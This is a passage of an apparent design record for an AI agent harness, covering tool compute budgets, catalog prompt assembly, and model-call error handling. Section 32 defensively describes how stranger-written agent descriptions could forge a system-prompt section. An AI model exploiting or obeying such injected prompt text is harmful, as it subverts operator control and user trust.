A cold interpreter plus sympy plus the tool module is **0.34s**, against a harness whose every step
is a multi-second model call. Two facts make it safe to wire in: all six math tools inject nothing
(`registry._injectable` is empty for them) and are pure functions of a JSON dict, while the five that
**do** inject — `ask_user`, `pin`, `remember`, `todo_write`, `spawn_subagent` — are exactly the ones
that block on a person rather than on CPU. And `registry.py`'s `spec.handler(` is the only production
call site of any handler, so there is one seam.

### Was any of this exploitable? Checked, because it decides H4

| claim | measured |
|---|---|
| Integer overflow | **Does not exist in Python.** Arbitrary precision, no wraparound, no fixed-width register — the C/C++ chain (overflow → undersized buffer → corruption) has no analogue |
| Native code in the path | **None.** `gmpy2` is not installed, sympy reports `GROUND_TYPES = 'python'`, mpmath is pure Python |
| Memory exhaustion | Real, but availability rather than integrity: `MemoryError` or the OOM killer, no attacker-controlled write |
| Whether a clock bounds memory | **Yes, loosely.** `pow(2, e)` allocates at ~39 MB/s measured, so a 15s budget is already a ~600 MB ceiling; `RLIMIT_AS` makes it hard where the platform allows |

So no parameter maximums (H4) — and the check is what surfaced H5 and H6, which are **shape** defects
that no size limit would have caught.

### Decisions

| # | Decision | Rationale |
|---|---|---|
| **H1** | **Every tool declares its cost class, and omission is fatal at import.** `ToolSpec.budget` ∈ {`BUDGET_COMPUTE`, `BUDGET_IO`, `BUDGET_HUMAN`}, with `assert_budget_declared()` beside R13's assert in `registry.py`. | R13's argument one question over, and its own words: *"None means UNDECLARED, not a default. Omission has to be a detectable mistake rather than an inherited answer — this field exists because the previous shape was a denylist in ONE consumer's module."* A per-parameter `le` list is that denylist again. |
| **H2** | **A `BUDGET_COMPUTE` tool runs in a killable subprocess, at `dispatch` only.** `module.run(params)` stays an ordinary in-process call. | A thread has no interruption point inside `sympy.binomial` to cancel at, so a watchdog over one reports a timeout while the core stays busy — the class of mechanism this project keeps refusing. Isolating at dispatch rather than in the six tools is what keeps `test_math_tools.py`'s 131 tests measuring the maths instead of the transport. |
| **H3** | **On Unix the child also carries `RLIMIT_CPU` and `RLIMIT_AS`, and both bounds report the same sentence.** Windows runs on the clock alone, recorded rather than hidden. | mcp_client's documented two-layer shape: an inner bound that stops the work, an outer one for when the inner never fires. **Not** `sandbox._unix_resource_limits` verbatim — that spends `SANDBOX_CPU_SECONDS` (30), which is *above* this budget, so reusing it would install a limit that can never fire while reading as though the inner layer were present. |
| **H4** | **No maximum on any math parameter.** | `combinations n=10**7 r=10**6` hangs on a pair where neither value alone looks unreasonable — cost is joint, so no per-parameter ceiling expresses it. And any number is a guess: `series order=100` is 0.34s, `order=1000` is 3.44s. |
| **H5** | **`modular_exponent` requires its modulus.** | `pow(b, e, None)` is plain exponentiation. Measured on one exponent: **0.000s** with a modulus, **3.3s and 125 MB** without. Refused at the boundary rather than left to H2's clock, because paying a full budget to learn that is the wrong answer to a one-word fix. Not a separate `power` operation either — that advertises the unbounded path instead of closing it. |
| **H6** | **A result the tool cannot serialise is the tool's own error.** `str(result)` moves inside `run()`'s `try`. | It sat outside, so a correct answer merely too large to print left the handler as a bare `ValueError` and was `logger.exception`'d with a traceback as though it were a bug. `factorial n=100000` reaches this on ordinary input. dispatch's containment is the backstop for real bugs; filling it with routine outcomes is how a real one stops being noticed. |
| **H7** | **An io tool must already carry its own bound — no outer watchdog — and #55 is what makes three declarations true.** | An outer clock over a blocking read can only stop *waiting*; mcp_client is honest that this is all its backstop does. Converting "add a watchdog" into "prove every tool declares a bound" removes the abandonment entirely, and turns #55 from a companion issue into the missing half of the io class. |
| **H8** | **A human tool's bound is the meter that already exists.** `ask_user` → `ATTENDED_APPROVAL_TIMEOUT_S`; `spawn_subagent` → the child's `max_steps` and the token budget. | Nothing new is built. The declaration turns an incidental fact into a stated one, which is the value of the field: today the reason `ask_user` may block ten minutes is knowable only by reading three files. |
| **H9** | **One config constant**, `TOOL_COMPUTE_TIMEOUT_S = 15`, beside `SANDBOX_TIMEOUT_SECONDS`. | The slowest *legitimate* call measured is `series order=1000` at 3.44s, so ~4× headroom; ten passes each burning a full budget is 150s rather than forever. One number to defend, next to the constant a reader compares it against. |
| **H10** | **The two committed checkpoints are deleted, and git is asked to keep them out.** | `.gitignore` already listed `.ipynb_checkpoints/` and gitignore does not untrack, so a gitignore-based check reported clean while the files sat there. The test asks what is **tracked**, not what is on disk: this working tree has eight such directories and one was ever committed, so a filesystem walk would fail on any machine with notebook history — and a test people learn to ignore protects nothing. |

### What the trace and the results look like afterwards

```
before  symbolic_math series order=100000        -- no return, ever
after   {"error": "symbolic_math exceeded its 15s limit and was stopped. The inputs
         given are too large for this operation -- try smaller values."}

before  discrete_math factorial n=100000
        {"error": "discrete_math failed: Exceeds the limit (4300 digits) for integer
         string conversion; use sys.set_int_max_str_digits() to increase the limit"}
        + a logger.exception traceback, for ordinary input
after   {"error": "The factorial result was computed but is too large to return
         (...). Ask for the same operation with smaller inputs."}

before  modular_exponent base=2 exponent=1e9 (no modulus)   -- 3.3s, 125 MB, then the above
after   {"error": "modular_exponent requires a modulus. Without one this is plain
         exponentiation, ..."}                              -- 0.36s
```

### #55's three sites, measured with `tracemalloc` against a 30 MB file

```
                             before    after
read (the bounded control)    0.0 MB   0.0 MB   <- always had os.path.getsize
edit                         60.0 MB   0.0 MB
read_project_doc             60.0 MB   0.1 MB
read_project_doc offset=25M  60.0 MB   0.1 MB   <- the per-page re-read
```

`edit_run` copies `read_run`'s guard verbatim so the two refuse identically. `read_project_doc`
deliberately does **not**: refusing a large document is not what that tool is for — I7 chose
`INIT_READ_CHARS` so `/init` could page through exactly such a document — so it seeks and reads one
chunk, which also removes the whole-file re-read a size check would have left in place. `fetch_url`
streams with a hard byte cap, because a `Content-Length` check is not a bound when the server can
omit the header or lie about it.

### The two bounds do not fail the same way, and that was live for a day

CI's first Linux run failed one test, and the test was right. On Unix the
CPU limit kills the **child**, so `subprocess.run` returns normally with a
negative returncode and **never raises `TimeoutExpired`** -- the parent's
timeout branch does not run at all:

```
Linux    3.00s  symbolic_math did not return a usable result (exit -9).
Windows  15.0s  symbolic_math exceeded its 15s limit and was stopped. The
                inputs given are too large -- try smaller values.
```

The platform with **two** bounds gave the worse answer, and the one with a
single wall clock gave the actionable one. `_interpret` now treats a
negative returncode as the bound firing and shares `_limit_message` with
the timeout path, so the two cannot drift again; a child that exits
non-zero *without* a signal still reports the generic message, because a
crash is not a budget problem and telling a model to try smaller numbers
would send it round a loop that cannot end.

Worth recording as a method note rather than only a fix: the container run
§21 requires exists precisely to catch this, and it had not been run when
the branch was pushed. The Windows suite was green, the mutation pass was
28/28, and neither could see it -- the two H3 mutations are declared
`expect="GREEN"` on Windows *because* their tests skip there, which is the
harness admitting in advance that this half was unverified.

### Deliberately not in §31

**#105** — `/quit` and ctrl+c do not check `_busy`, and Textual's non-daemon workers keep `App.run()`
from returning. The same root as #57, an in-flight thread nothing can interrupt, but its fix site is
`tui/app.py` and its subject is the pipeline worker rather than a tool call.

**Bounding the other math tools' inputs.** `linear_algebra`, `probability_stats`, `geometry` and
`logic` take unbounded lists and expression strings. H2 covers their *cost*; whether a 25-variable
truth table should be refused before it is attempted is a separate question, and H4's reasoning
applies to it unchanged.

**A warm subprocess pool.** 0.34s per call did not justify it, and a pool holds interpreters a killed
call would have to replace anyway — the state a pooled worker accumulates is exactly what a bound
exists to discard.

## 32. The catalogs — what the model is told it can do, and who gets to write it — BUILT

**Six findings from audit unit 8 (agents, skills, prompt assembly), two of them S2 and one of
those the last open S2 in security.** They are one property seen from six sides: *the model is
told what it can do by text this harness assembles, and some of that text comes from files a
stranger wrote.*

Measured against the working tree before any change, not read off the issues:

| | |
|---|---|
| **#68** | `with_catalogs` gated on `registry.is_allowed(name, context)` — POLICY — while `registry.schemas()` decides advertisement from context **and** `callable_only` **and** `granted`. Pass 1's prompt was 4,223 chars and the agent section 819 of them, **19%**, instructing the model to call a tool the pass has no schema for |
| **#131** | `description=str(fm.get("description", ""))` for both defs, rendered as `- {name}: {description}` — so a YAML block scalar leaves its bullet and forges a top-level section in every system prompt |
| **#69** | All four shipped agents are internal machinery. `AgentDef` had no `spawnable`, no `internal`, no `invoked_by` |
| **#70** | `approval_notice` and `request_payload` both return empty for an unknown agent, so the human got a `subagent_signoff` modal with nothing in it, then an error either way |
| **#71** | `sorted(["first", "second"]) == ["first", "second"]` — the one test named for activation order could not observe it |
| **#72** | `DEFAULT_SYSTEM_PROMPT = "You are a helpful assistant."` — 28 characters, and the injection defence lived only in the pipeline preamble |

### The catalog was asking a question with the wrong answer in it

The harness stated the contradiction to its log and to the model in the same breath. A research
pass is headless, so `core/loop.py` computes `headless = response_channel is None`, drops
`spawn_subagent` from the schema list, and logs it in that run's own `headless_hidden()` WARNING —
while `with_catalogs` appended 819 characters saying *"The agents below can be spawned with the
**spawn_subagent tool**"*.

The reason is a seam, not a mistake in either half. **The schemas are built where the run is; the
prompt is built before the run exists.** `registry.schemas()` is called inside `_run()` at
`core/loop.py:561`, after the bundle has been unpacked into primitives. `pass_prompt` is called at
`:1119`, `system_prompt_for` in `agents/manager.py`, `with_catalogs` in `tui/app.py` — all of them
frames earlier, holding a `ToolContext` and nothing else. So the catalog asked the only question it
could reach, and `is_allowed` is a genuinely different question from the one `schemas()` answers.

This is f19's defect on the axis f19 did not cover, and `with_catalogs`' own docstring already
carried the argument: *"each catalog's prose INSTRUCTS the model to call a tool … so every agent
whose allowed_tools excludes one of those was invited to call a tool it does not have."* That
reasoning is not specific to the context axis. It was fixed for `ToolContext` and left open for the
headless filter — which is the axis the pipeline **always** runs on.

### Design Decisions Record — §32 (A1–A11)

| id | decision |
|---|---|
| **A1** | **`registry.is_advertised()` is the one predicate.** `schemas()`, `headless_hidden()` and `with_catalogs()` are three readers of one answer, never three copies of one filter |
| **A2** | **The catalogs take `callable_only` / `granted` — the same names, defaults and meaning as `schemas()`.** The facts come from the bundle that already carries them, unpacked once by `advertisement_facts()` |
| **A3** | **`AgentDef.spawnable` is declared for ours and off by default for theirs.** A harness-tier omission is a build error naming every offender; a user's or a project's omission gets the safe answer |
| **A4** | **The four shipped agents declare `spawnable: false`, each with its reason in the file.** D6's model-initiated half advertises nothing in the default install, and that is recorded rather than hidden |
| **A5** | **Catalog text is normalised at the producer** — whitespace collapsed, capped at one constant, applied to `name` **and** `description`, at parse time, for every tier |
| **A6** | **The trust prompt shows the descriptions it is deciding about**, parsed through `_parse_md_file` so what is displayed is what would be injected |
| **A7** | **One `refusal_reason`, read in three places that must agree**: the loop before it asks, `dispatch` before its approval gate, `run()` as the direct-caller backstop |
| **A8** | **The untrusted-content paragraph is one file with two tails.** The pipeline's concatenation reproduces the original byte for byte |
| **A9** | **`is_advertised` is a predicate, not a membership test against `schemas()`.** Both sides need the answer; only one is in a position to enumerate |
| **A10** | **A pre-flight refusal is RETURNED, not raised.** `ToolCallDenied` means policy blocked you, which is a different fact the model should be able to tell apart |
| **A11** | **The "our own files comply" check is a test, not a runtime assert.** H1's shape would abort startup on a USER's machine for a mistake in OUR repository |

### What the batch actually moved

```
                                          before          after
Pass 1 prompt, headless                 4,223 chars    3,402 chars   (-19%)
Pass 1 prompt, attended                 4,223 chars    3,402 chars   (A4)
agents advertised, default install          4              0
a 5,000-char description becomes        5,000 chars      300 chars
a description with newlines             5 lines        1 line
trust prompt shows descriptions            no             yes
chat's base prompt                         28 chars       618 chars
```

The attended row is A4 and the headless row is A2, and they remove the same 819 characters for two
independent reasons. #69 said so in advance: *"fixing either alone leaves the other."*

### A3's asymmetry is the decision, not an omission

R13's rule — *"None means UNDECLARED, not a default. Omission has to be a detectable mistake rather
than an inherited answer"* — was written about a field on a tool this project registers. Applied to
a file **someone else** wrote, it gives the wrong answer: raising would take down startup over a
stranger's frontmatter, which is the trade `_parse_md_file` refuses everywhere else in the module
(*"a broken definition warns and skips rather than taking down startup"*).

So the rule splits by authorship. Our omission is a build error; a stranger's omission gets the safe
answer, which is not-spawnable, because an agent written for `/agent` and silently advertised as
spawnable is #69's actual complaint. Not-spawnable is a **default rather than a ban**: a project
declaring `spawnable: true` is advertised, or this would be a prohibition wearing a default's
clothes.

### The failure #69 prevents is not a crash

`spawn_subagent` passes exactly one thing: `params["task"]`, as the first message of a fresh thread.
A spawned `grill-me` is told *"read the thread so far"* in a thread whose only message is the task
string the parent wrote, so it grills the task description and returns that as a specialist's
verdict. `compactor` is sharper — `max_steps: 1`, no tools, and a body ending *"For the rest of this
conversation, your summary IS what happened."*

Degraded rather than broken, and the parent has no way to tell. That is what makes it worth a field
rather than a note.

### `needs_approval = False` is not "proceed", and that was live for an hour

A7's first version cleared `needs_approval` in the loop, copying the `is_allowed` line directly above
it. Driving a turn end to end produced:

```
spawn_subagent requires approval and was not given
```

for an unknown agent name — a cause that is not the cause, and **worse than the empty modal it
replaced**. Clearing the flag only stops the LOOP asking; `dispatch()` then re-checks approval
itself, finds no callback because nothing asked, and denies. The precedent works only because
dispatch raises its own, correct `ToolCallDenied` first.

So the pre-flight belongs in `dispatch`, ahead of the approval gate, and the loop's skip then behaves
exactly like the line it copies. Caught by `test_the_refusal_still_reaches_the_model`, which exists
because skipping a useless question must not also skip the answer — the same shape as §31's
`test_a_crashed_child_is_NOT_reported_as_a_limit`.

### A4 made three of another unit's tests vacuous, and the change is what found it

`test_review.py::TestCatalogsFollowTheContext` asserted `"## Available agents"` in and out of prompts
built from the **real** catalog. With every shipped agent non-spawnable that catalog is empty, so
three of its assertions would have passed for the wrong reason: *absent because the context
suppressed it* and *absent because there was nothing to suppress* are the same observation.

This is the vacuity class §31 recorded for `os.times()` and #71 records for `first`/`second`, reached
a third way — and by a change rather than by a sweep. Worth stating as a rule: **a fix that empties a
collection makes every test asserting absence from that collection vacuous**, and the fix's own batch
is the only moment anyone is positioned to notice.

### The two provider-side facts the mutation pass turned up

Neither is a defect of this batch; both are properties of the registry that writing discriminating
tests forced someone to measure.

**No shipped builtin is both approval-gated and `GRANT_ANYWHERE`.** The three gated names are
`remember` (never), `spawn_subagent` (never) and `write_project_doc` (signoff_only), so R15's granted
branch in `is_advertised`/`schemas` is reachable today **only by an MCP tool**. The control test
registers one rather than selecting off the roster: a skipping control is not a control.

**`is_allowed("load_skill", ctx)` and `is_advertised(...)` agree everywhere the shipped install can
reach**, because `load_skill` is not approval-gated by default and its `available_check` is exactly
"the catalog is non-empty" — so when it says no, the append is a no-op either way. Reverting that one
condition survived 2,082 tests. It is **not** inert: an agent may declare
`approval_overrides: {load_skill: true}`, D14 makes that a one-way ratchet, and a headless run would
then be handed a catalog of skills it cannot load. Driven and confirmed reachable before a test was
written for it, rather than assumed inert and left.

### Verification

- **38 mutations, 38 RED.** Four survived the first run: three were gaps in this batch's own tests
  (the pass entry point never driven, a boundary asserted as "different from" rather than "bounded
  by", a constant asserted instead of the prompt built from it) and the fourth was the `load_skill`
  case above.
- **One survivor first scored a FALSE KILL.** It came back `RED(full)` because three tests added
  minutes earlier had not yet been counted in the docs, so the full suite was red for an unrelated
  reason. The standard's "re-run every survivor against the whole suite" step is what produced the
  wrong answer; a full-suite verdict is only meaningful **from a green baseline**. Batch 11 lost 25
  rows to a version of this. This cost one, and was caught by reading *which* tests failed rather
  than trusting the exit code.
- **`python:3.11-slim`, the CI configuration: 2,078 passed / 2 skipped / 1 deselected**, every
  decision behaving identically to Windows, `main.py --help` exit 0, `import tui.app` ok, and Pass
  1's digest matching. Run **before** the branch went anywhere, which is the correction §31 recorded
  and did not get to apply.

### Deliberately not in §32

**A non-advertised agent can still be spawned by name.** `spawnable` decides what the model is
**told** exists, not what it may call — the field's own comment says so, and C6 still caps the
child's tools while the depth limit still applies. A model that names `grill-me` without being
offered it still gets the degraded spawn #69 describes. Making it a permission is a different
decision from making it a catalog filter, and #69 asked for the catalog.

**#105** — `/quit` and ctrl+c do not check `_busy`. Deferred again, for the reason §31 gives.

**The remaining fourteen S2s.** #4, #10, #14, #16, #17, #26, #37, #60, #61, #77, #89, #96, #105 and
#138. Two clusters were verified in code alongside this one and are the natural successors: the call
boundary (#37 S2 + #38, #39, #135 — one file, and a malformed tool-call arguments string still
escapes `call_model_stream` into the pipeline's `except Exception`) and `/init`'s vocabulary (#96 S2
+ #94, #95, #98).

## 33. The call boundary — the one file every model call goes through — BUILT

**Four findings, and the audit's first unit tracker closed.** `core/client.py` is the only file
allowed to know a provider's wire format and the single point every model call in both shells and
all ten research passes goes through. Unit 3 filed six; three were already closed (#35, #36, #40),
so **#37 + #38 + #39 closes unit 3 (#41)**. #135 is unit X2's and lives in the same file.

Measured against the working tree before any change, not read off the issues:

| | |
|---|---|
| **#37** | `json.loads(raw_args)` with no error handling, and `core/loop.py`'s call site inside no `try`. A response cut mid-arguments raises `JSONDecodeError` out of the generator, out of `_run()`, and into the pipeline's `except Exception` — `status='failed'` on a run that had finished nine passes |
| **#38** | `call_model` (110 lines) and `collect_response` — zero production callers. Already diverged from the streaming path on `raw`, which was `None` on every live path behind a comment saying it held the SDK response |
| **#39** | `list_models` / `select_model` — zero references anywhere, tests included, and `list_models` is OpenAI-shaped while its signature promises provider neutrality |
| **#135** | `main.py --help` **2,619 ms**, of which `import core.client` was **1,766 ms**, for three SDKs of which any one run uses at most one |

### Two corrections to the issues, from driving them

**`json.loads` is OpenAI-only.** #37 says "both call paths". In fact Google hands back `fc.args`
and Anthropic hands back `b.input`, both already dicts, so the exposure is exactly the
`is_v1_compatible` branch. That does not lower the severity — that branch is what a local model
server takes, which is where truncated tool arguments are likeliest — but the fix has one shape
rather than three. #38 removed the second site along with `call_model`, which is why that slice
went first.

**#135's proposed fix would have left the defect in place.** It suggested `from google.genai import
types as genai_types` as "the first statement" of each function that names it. Three of those
functions use the name only on their GOOGLE branch, so a top-of-function import is paid on every
**Anthropic** turn — most of them. Each import sits inside the branch instead.

### Design Decisions Record — §33 (W1–W9)

| id | decision |
|---|---|
| **W1** | **The translation gets the containment `dispatch()` already gives handlers.** A malformed `arguments` string becomes a tool result of `{"error": ...}`; it is never raised |
| **W2** | **`ToolCallRequest.parse_error` is transport only.** `add_assistant_message` persists `{id, name, input}` unchanged — a parse failure is a fact about one wire read, not about the thread |
| **W3** | **A call refused for a parse failure is never dispatched and never asked about.** A7's rule, and A7's control: the refusal must still reach the model |
| **W4** | **`finish_reason` is captured where `chunk.choices[0]` is already read**, and named only when it is `"length"`. Nothing in `core/` read a provider `finish_reason` before this |
| **W5** | **`call_model` and `collect_response` are deleted, not kept and pinned.** Two implementations, one of which runs, already diverged |
| **W6** | **`ModelResponse.raw` goes with them.** Set only by `call_model`; keeping it turns an accurate-but-divergent field into a newly false claim |
| **W7** | **The SDK imports move to their point of use — inside the branch, not the top of the function** — and the record says why, because deferred imports are not otherwise this file's idiom |
| **W8** | **`list_models` / `select_model` are deleted rather than rewritten per provider.** A dead helper that is *wrong* is worse than a dead helper, because it will be reached for |
| **W9** | **The empty-arguments fallback gets the test it never had.** Unit 3's mutation P10 deleted it and was green on all 1406 |

### What the batch actually moved

```
                                          before          after
main.py --help                          2,619 ms       1,182 ms   (-55%)
  import core.client within it          1,766 ms          58 ms   (-97%)
  python -c pass (the baseline)             33 ms          32 ms
a tool call cut mid-arguments           kills the run   one refused call
  and the model is told                     no            yes
  and the reason names the cut              no            yes
json.loads calls on a wire string             2              1 (contained)
core/client.py                            932 lines      901 lines
provider SDKs imported to print --help        3              0
```

The launch numbers are **paired** — `git stash` between runs, with the AFTER runs bracketing the
BEFORE — because absolute milliseconds on this machine varied by 2× between sessions and the share
is the only stable claim. On Linux, in the CI container: `import core.client` **54 ms**,
`main.py --help` **1,078 ms** (container timings move with host load too; the paired
Windows pair above is the claim, and Linux only has to agree in shape).

### `needs_approval = False` is not "proceed", again — and this time it was designed in

A7 (§32) learned this the hard way: clearing the flag stops the LOOP asking, and `dispatch()` then
denies for a reason that is not the reason. Here the same shape appears and the lesson held — the
loop suppresses the question **and** the call is refused before dispatch, in the same change.

The difference from A7 is where the refusal lives. A7's moved *into* `dispatch()`; this one cannot,
because `dispatch(name, params, context)` never sees the failure — `{}` is a perfectly good empty
dict by the time it arrives. The loop is the only layer that can see a `parse_error`, so the loop is
where it is enforced, and W1 records that as a decision rather than an inconsistency.

### The mutation pass found a new sub-shape of the vacuity class

24 mutations. One survivor — and it was a mutation of a line this batch had **written a test for**.
`test_finish_reason_survives_the_usage_chunk` asserted that a length cut is still reported after the
usage chunk arrives. True, and irrelevant: a usage chunk has `choices: []`, so `if chunk.choices:`
skips it and the line under test is **never reached**.

Driven both ways rather than guessed. With `or finish_reason` deleted, the usage-chunk shape still
reports the length cut; a trailing chunk that *has* choices and a null `finish_reason` falls back to
the generic message. So the defence is load-bearing, and reachable for exactly the class of provider
this file already accommodates twenty lines above — the `name_parts` accumulation exists because
*"some v1-compatible providers split function.name across deltas, so a last-write-wins assignment
would corrupt the name"*. This is the same defence for the same reason.

The class now has four instances, and this is a new sub-shape:

| | why it could not see the property |
|---|---|
| §31 `os.times()` | the input is already `0.0` on the platform |
| §32 / #71 `first`/`second` | the inputs are already in sorted order |
| §32 / #69 the emptied catalog | *absent because suppressed* and *absent because empty* are one observation |
| **§33 the usage chunk** | **a guard upstream skips the input, so it never reaches the line it is named for** |

The first three are about inputs that cannot **discriminate**. This one is about an input that
cannot **arrive**. Worth separating, because the sweep that finds the first three — vary the input,
see if the assertion still holds — does not find this one: the assertion does hold, for a reason
that has nothing to do with the code being tested.

Final: **24 of 24 RED.**

### Verification

- **Windows: 2,087 passed / 18 skipped / 1 deselected.**
- **`python:3.11-slim`, the CI configuration: 2,103 passed / 2 skipped / 1 deselected**, with every
  W-decision driven on Linux and behaving identically, `main.py --help` exit 0 and `import tui.app`
  ok. Run **before** the branch went anywhere — the third batch to honour §31's correction, and the
  first run of it was thrown away rather than reported, because it had copied the tree between a
  test being added and its count being synced and so was red for a reason that was not the code.
- **24 of 24 mutations RED**, from a green baseline on the full suite as well as the unit files —
  §32's false-kill lesson, now enforced by the harness rather than remembered.

### Closed with this section

**Unit 3 (#41) — the first unit TRACKER of Audit Pass 1 to be closed.** Six findings: #35, #36,
#40 in earlier batches; #37, #38, #39 here. Twenty-two unit trackers were open when this batch
started and none had ever been closed.

> **Corrected in batch 14.** This paragraph originally read *"the first unit of Audit Pass 1
> closed"*, which says the first unit **finished**. It was not. Unit 3 was the **eighth**; units
> 16 (#130) and X4 (#145) were both complete on **2026-08-17**, four days before this batch. Seven
> units were carrying no open findings and an open tracker while this was being written, and
> closing #39 made it eight — none of which was visible from the tracker list, because closing a
> tracker was not part of any batch's routine. The narrow claim was true and is what the sentence
> now says: no unit tracker had ever been closed, and this batch closed the first. **The general
> lesson is the one worth carrying: a queue that is never drained stops being evidence of
> anything, and "no unit has been closed" was read as "no unit is done" by the session that wrote
> it — including when that session was the one closing the issues.** Batch 14 closed the other
> eight, and put the fix progress on the master tracker #15, where the next session will find it
> without recomputing it.

### Deliberately not in §33

**sympy's ~330 ms**, reached because `tools/registry.py` imports the six maths tools to register
them, which `core/loop.py` imports. That is unit 5's file, rewritten last batch for A1, and
registration at import time is a design rather than an oversight — deferring it is a different
decision from moving an import to its use site. Filed and measured with the number attached.

**#136**, unit X2's other finding. Closing it would close X2 as well, but it is in compaction, and
this batch's coherence is one file.

**#105**, deferred again for the reason §31 gives.

**The remaining thirteen S2s.** #4, #10, #14, #16, #17, #26, #60, #61, #77, #89, #96, #105 and
#138. Two clusters were verified in code alongside this one: **/init's vocabulary** (#96 S2 + #94,
#95, #98 — which would close unit 12, and where #96 and #94 both reproduced exactly) and **the
record itself** (#16 S2 + #17 S2 + #147, #91 — two S2s, but docs-only, so a different batch shape
with no mutation pass).

## 34. /init's vocabulary — four lists for one question — BUILT

**Four findings, unit 12 closed, and the audit's tracker arithmetic corrected.** `/init` is the
command that writes eight documents into someone's project. It kept **four** separate answers to
"what counts as a project file", and no two agreed:

```
1. manifest._MANIFEST_FILES                12 names
2. detect_facts sets 'stack' for            7 of those 12
     reads NO branch:  Gemfile, pom.xml, build.gradle, Makefile, Dockerfile
3. _root_documents.interesting              *.md/.markdown/.rst + readme* + all 12
4. project_docs allowlist                   4 extensions + 10 exact names
```

Each disagreement was a filed finding, which is why they are one batch rather than four.

| | driven against the tree before anything was written |
|---|---|
| **#96** (S2) | **5 of 10** project shapes proposed **wrong**. A Java/Maven, Java/Gradle, Ruby, C/make or container-only project was proposed as `research` — with `"no code manifests found"` printed as the reason, **while the manifest shown to the agent listed the manifest** |
| **#94** (S3) | over the listing: *"Paths below are exactly what `read_project_doc` expects."* Advertised **15**, refused **6**; readable-but-unlisted **4** |
| **#95** (S3) | a write that fails partway names only the failure, discards the list of files it *did* create, and skips the I6 trust re-grant — `trusted: True → False`, silently |
| **#98** (S3) | five properties with no test, and **two tests that cannot see the property in their own name** |

### Design Decisions Record — §34 (U1–U9)

| id | decision |
|---|---|
| **U1** | **`detect_facts` learns the five it never read**, rather than `propose_kind` merely counting them. The minimal fix stops the false sentence and leaves `stack` empty, so `_fact_lines` produces nothing and a Java project's stubs stay identical to a research project's |
| **U2** | **The "Readable documents" listing derives from the read tool's own predicate.** One producer for "what is readable", so the printed sentence is true by construction |
| **U3** | **`_DOC_FILENAMES` gains five build manifests, matched at the project ROOT only.** The first entries that are; the existing ten keep depth-matching |
| **U4** | **The redactor's gap is filed, not fixed here** (#167). A pattern added to `safety/policy_enforcement.py` redacts content out of *every* tool result in the harness |
| **U5** | **`readme.bin` is fixed listing-side.** Nothing needs a `.bin` readable; the defect was the listing's |
| **U6** | **A partial `/init` reports what it wrote and settles trust on both paths** |
| **U7** | **No rollback.** `CONTEXT.md`'s previous content is overwritten at the first step and cannot be restored |
| **U8** | **The two vacuous tests are rewritten, not supplemented.** A test named for a property it cannot see reads as coverage in a report |
| **U9** | **`_MANIFEST_FILES` and the fact branches become one table.** Two lists that happen to overlap is how four vocabularies got here |

### The question that decided U3, and why it was driven rather than argued

`project_docs.py`'s docstring locks the readable set as *documentation, not "text files"*, with the
reason: this tool is advertised to **every** run, so *"widening this to source files would quietly
turn it into `read` with no approval gate"*. `setup.py` is source. That is a real objection and it
had to be answered with the matcher rather than with an opinion.

The matcher has two independent rules — an exact-basename list and a suffix list — so the five are
added as **five filenames** and `.py` never enters `_DOC_EXTENSIONS`. Driven:

```
  setup.py             -> READABLE          '.py' in _DOC_EXTENSIONS: False
  main.py              -> refused
  config.py            -> refused
  credentials.py       -> refused
  src/vendor/app.py    -> refused
```

The probe then found an exposure **nobody had raised**: the basename match ignores the directory,
so `setup.py` would have meant *every* `setup.py` in the tree, including a vendored one. Every
existing entry behaves that way today. The five are therefore root-only — a tightening shipped with
the widening, and the reason the batch is not simply "five more names".

### What the batch moved

```
                                                    before        after
propose_kind, 10 project shapes                 5 wrong        0 wrong
  and the printed reason                        false          names the files it found
detect_facts sets a stack for                   7 of 12        10 of 12
  (Makefile and Dockerfile carry none, deliberately)
manifest listing vs the read tool               15 / 6 refused  18 / 0 refused
  readable but unlisted                         4              0
a /init that fails at the 4th of 8 writes       names 0 of 5    names 5 of 5
  and the trust the user had                    True -> False   True -> True
vocabularies for "what counts as a project file"     4              1
```

### The mutation pass found #98's own defect inside #98's fix

27 mutations, **two survivors**, and both were tests written *in this batch* for the finding about
tests that cannot see their own property. Diagnosed rather than guessed:

| survivor | why it could not see the property |
|---|---|
| `U8-the-tree-files-are-unsorted` | `os.walk` hands back an **already sorted** list on this filesystem, so three ordinary filenames could not discriminate the `sorted()` call — the same defect as the test it replaced |
| `U8-first_heading-reads-the-whole-file` | `_first_heading` returns on the first **non-empty** line, so a heading after 5,000 `x`s was unreachable whether the read was capped or not |

Both are the **discriminate** sub-shape the vacuity sweep is supposed to catch, and it did — because
the sweep is now a mutation pass rather than a reading. The fixes hold the filesystem still: a
helper hands back reversed order so `sorted()` is the only thing that could produce sorted output,
and the padding became blank lines so the buried heading can actually be reached.

**Final: 27 of 27 RED**, from a control green on the unit file and on the full suite.

That the finding's own shape appeared in its own fix is the argument for the standard, not against
it. #98 says a test named for a property it cannot see *"reads as coverage in a report, which is
worse than an acknowledged gap"* — and two of the five replacements would have done exactly that
if the pass had been a formality run after the fact.

### Verification

- **Windows: 2,138 passed / 18 skipped / 1 deselected.**
- **`python:3.11-slim`, the CI configuration: 2,154 passed / 2 skipped / 1 deselected**, with every
  U-decision driven on Linux. It mattered more than usual: three of them read the filesystem —
  sorted listings, a root-only path rule and a case-folded basename — and the two platforms
  disagree about all three. `main.py --help` exit 0, `import tui.app` ok. Run **before** the branch
  went anywhere, the fourth batch to honour §31's correction.
- **27 of 27 mutations RED.**

Worth recording from the Linux run: `SETUP.PY`, `gemfile` and `Pom.Xml` are all readable there,
because `_is_readable_doc` folds the basename to lower case. That is **pre-existing** — it is how
`Makefile`, `makefile`, `LICENSE` and `license` have always all matched — and the five inherit it
rather than introduce it.

### Closed with this section

**Unit 12 (#99).** Five findings: #97 in an earlier batch; #94, #95, #96, #98 here.

### The audit's tracker arithmetic, corrected in this batch

§33 called unit 3 *"the first unit of Audit Pass 1 closed"*. Checking whether batch 13's issues had
been closed showed that **#39 was fixed by batch 13 and never closed**, and then that **seven other
units were carrying no open findings and an open tracker** — units 6, 8, 13, 15, 16, X1 and X4.
Units 16 and X4 had been complete since **2026-08-17**, four days before unit 3.

Eight trackers closed with no code written, plus unit 12 here. The master tracker **#15** gained a
**Fix progress** table computed from the issues rather than hand-maintained, because #15 recorded
audit completion and *nothing recorded fix completion* — which is how a finished unit stayed open
for four days and how a batch came to believe it had closed the first one.

**The general lesson, and the reason it is in the record rather than in a commit message: a queue
that is never drained stops being evidence of anything.** "No unit has been closed" was read as "no
unit is done" by the session that wrote it — including when that session was the one closing the
issues.

### Deliberately not in §34

**#167**, filed by this batch (U4). `_SECRET_PATTERNS` matches seven vendor token prefixes, so a
